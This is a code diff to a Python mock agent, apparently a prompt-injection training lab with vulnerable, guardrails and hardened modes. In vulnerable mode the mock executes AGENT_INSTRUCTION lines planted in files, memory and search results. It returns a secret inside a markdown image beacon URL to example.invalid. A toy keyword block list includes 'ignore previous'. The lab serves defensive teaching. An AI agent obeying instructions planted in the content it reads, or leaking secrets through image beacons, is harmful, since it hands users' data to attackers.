@@ -40,28 +40,30 @@ def run_mock(lab,s,prompt):
         return result
 
     # Toy input rail only. It does not replace file authorization.
-    if s.mode=='guardrails' and any(x in prompt.lower() for x in ('reveal','secret','密钥','ignore previous')):
+    if s.mode=='guardrails' and any(x in prompt.lower() for x in ('reveal','secret','credential','demo-key','demo key','ignore previous')):
         return '[Input rail] Keyword policy blocked this request.'
     if s.mode!='hardened':
         for entry in s.memory[:8]:
             for ins in _instructions(entry['content']):
                 call(ins.get('tool'),ins.get('arguments',{}))
-    repeat=re.search(r'(?:重复|repeat).*?(\d+)',prompt,re.I)
+    repeat=re.search(r'repeat.*?(\d+)',prompt,re.I)
     if repeat:
         for _ in range(min(int(repeat.group(1)),24)):
             if call('search_files',{'query':'Phoenix'})['status']=='DENIED': break
         return f'[Deterministic mock] Tool loop ended at {s.calls} calls.\n'+'\n'.join(output[-3:])
-    if any(x in prompt.lower() for x in ('配置密钥','configuration key','reveal the secret')):
+    if any(x in prompt.lower() for x in ('configuration key','reveal the secret')):
         return ('Configuration: '+SECRET+'\n![status](https://example.invalid/beacon?d='+SECRET+')'
                 if s.mode=='vulnerable' else '[Output rail] No secret is placed in model context.')
     # Parse ordinary file requests rather than looking at active scenario ID.
-    paths=re.findall(r'(?i)(?:shared|users|restricted)[\\/][^\s，。；"\'`]+',prompt)
+    paths=[p.rstrip('.,;)') for p in re.findall(r'(?i)(?:shared|users|restricted)[\\/][^\s,;"\'`]+',prompt)]
+    low=prompt.lower()
     if paths:
-        if prompt.startswith(('删除','delete ')):
+        if low.startswith('delete '):
             call('delete_file',{'path':paths[0]})
             return '[Deterministic mock]\n'+'\n'.join(output)
-        if prompt.startswith(('写入','write ')):
-            content=prompt.split('内容：',1)[-1] if '内容：' in prompt else prompt.split('content:',1)[-1]
+        if low.startswith('write '):
+            parts=re.split(r'content:',prompt,maxsplit=1,flags=re.I)
+            content=parts[1] if len(parts)>1 else prompt
             call('write_file',{'path':paths[0],'content':content})
             return '[Deterministic mock]\n'+'\n'.join(output)
         result=call('read_file',{'path':paths[0]})
@@ -69,10 +71,10 @@ def run_mock(lab,s,prompt):
             if s.mode!='hardened':
                 for ins in list(_instructions(result['content']))[:6]:
                     call(ins.get('tool'),ins.get('arguments',{}))
-            if len(paths)>1 and any(w in prompt for w in ('保存','save')):
+            if len(paths)>1 and 'save' in low:
                 clean='\n'.join(x for x in result['content'].splitlines() if 'AGENT_INSTRUCTION:' not in x)
                 call('write_file',{'path':paths[1],'content':'# Phoenix summary\n'+clean[:3000]})
-    elif '搜索' in prompt or 'search' in prompt.lower():
+    elif 'search' in low:
         query=('PAYROLL-CANARY' if 'PAYROLL-CANARY' in prompt
                else 'DEMO-KEY' if 'DEMO-KEY' in prompt else 'Phoenix')
         result=call('search_files',{'query':query})
@@ -80,7 +82,7 @@ def run_mock(lab,s,prompt):
             for match in result.get('matches',[]):
                 for ins in _instructions(match['content']): call(ins.get('tool'),ins.get('arguments',{}))
     if not output:
-        return '[Deterministic mock] Ready. Ask to read shared/phoenix.md or search Phoenix.'
+        return '[Deterministic mock] Ready. Ask me to read shared/phoenix.md or search for Phoenix.'
     # Ignore malicious instruction text in the displayed summary in the hardened simulator.
     text='\n'.join(output)
     if s.mode=='hardened': text='\n'.join(x for x in text.splitlines() if 'AGENT_INSTRUCTION:' not in x)
